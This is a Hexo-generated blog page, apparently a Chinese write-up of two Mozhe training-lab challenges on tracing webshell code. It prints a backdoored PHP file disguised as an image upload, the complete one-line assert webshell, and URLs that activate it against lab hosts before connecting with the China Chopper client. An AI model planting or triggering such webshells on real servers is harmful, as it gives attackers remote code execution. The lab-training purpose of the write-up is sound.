@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>墨者WebShell代码分析溯源 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="WebShell代码分析溯源第六题首先我们进入实验环境，下载系统源码 在源码  www_bak\Assets\upload  中找到伪装成  .jpg  的  pic3.jpg.php  因为它出现在upload文件夹中。 在文件中找到以下代码： 123456&amp;lt;?phperror_reporting(0);$e = $_REQUEST[&apos;e&apos;];     //php request请求$ar">
+<meta property="og:type" content="article">
+<meta property="og:title" content="墨者WebShell代码分析溯源">
+<meta property="og:url" content="http://yoursite.com/2019/04/03/墨者WebShell代码分析溯源/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="WebShell代码分析溯源第六题首先我们进入实验环境，下载系统源码 在源码  www_bak\Assets\upload  中找到伪装成  .jpg  的  pic3.jpg.php  因为它出现在upload文件夹中。 在文件中找到以下代码： 123456&amp;lt;?phperror_reporting(0);$e = $_REQUEST[&apos;e&apos;];     //php request请求$ar">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.loli.net/2019/04/03/5ca47e4d49d1b.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/03/5ca48c44e3533.png">
+<meta property="og:updated_time" content="2019-04-03T10:41:24.523Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="墨者WebShell代码分析溯源">
+<meta name="twitter:description" content="WebShell代码分析溯源第六题首先我们进入实验环境，下载系统源码 在源码  www_bak\Assets\upload  中找到伪装成  .jpg  的  pic3.jpg.php  因为它出现在upload文件夹中。 在文件中找到以下代码： 123456&amp;lt;?phperror_reporting(0);$e = $_REQUEST[&apos;e&apos;];     //php request请求$ar">
+<meta name="twitter:image" content="https://i.loli.net/2019/04/03/5ca47e4d49d1b.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-墨者WebShell代码分析溯源" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/03/墨者WebShell代码分析溯源/" class="article-date">
+  <time datetime="2019-04-03T05:38:18.000Z" itemprop="datePublished">2019-04-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      墨者WebShell代码分析溯源
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="WebShell代码分析溯源"><a href="#WebShell代码分析溯源" class="headerlink" title="WebShell代码分析溯源"></a>WebShell代码分析溯源</h1><h3 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h3><p>首先我们进入实验环境，下载系统源码</p>
+<p>在源码  www_bak\Assets\upload  中找到伪装成  .jpg  的  pic3.jpg.php  因为它出现在upload文件夹中。</p>
+<p>在文件中找到以下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];     <span class="comment">//php request请求</span></span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'POST'</span>],);</span><br><span class="line">array_map(base64_decode($e), $arr);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>一句话木马并不完整，我们要利用request请求把它补全：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> assert($_POST[<span class="string">'s'</span>]);<span class="meta">?&gt;</span>   <span class="comment">//完整的一句话木马</span></span><br></pre></td></tr></table></figure>
+<p>补全时吧assert转为base64</p>
+<p>构建url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43185/www/Asset/upload/pic3.jpg.php?e=YXNzZXJ0</span><br></pre></td></tr></table></figure>
+<p>使用菜刀连接：</p>
+<p><img src="https://i.loli.net/2019/04/03/5ca47e4d49d1b.png" alt=""></p>
+<p>在html下找到key</p>
+<h3 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h3><p>第七题和第六题大致相同</p>
+<p>构建url：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:40007/www/random_int.php?e=YXNzZXJ0</span><br></pre></td></tr></table></figure>
+<p>这次有问题的代码在www/random_int.php</p>
+<p>使用菜刀连接即可：</p>
+<p><img src="https://i.loli.net/2019/04/03/5ca48c44e3533.png" alt=""></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/04/03/墨者WebShell代码分析溯源/" data-id="cju137q7j0003tsu6ks8dhpod" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/03/26/CVE-2018-12613/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CVE-2018-12613</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/04/03/墨者WebShell代码分析溯源/">墨者WebShell代码分析溯源</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/26/CVE-2018-12613/">CVE-2018-12613</a>
+          </li>
+        
+          <li>
+            <a href="/2019/02/13/python requests/">python</a>
+          </li>
+        
+          <li>
+            <a href="/2019/01/29/python/">python</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
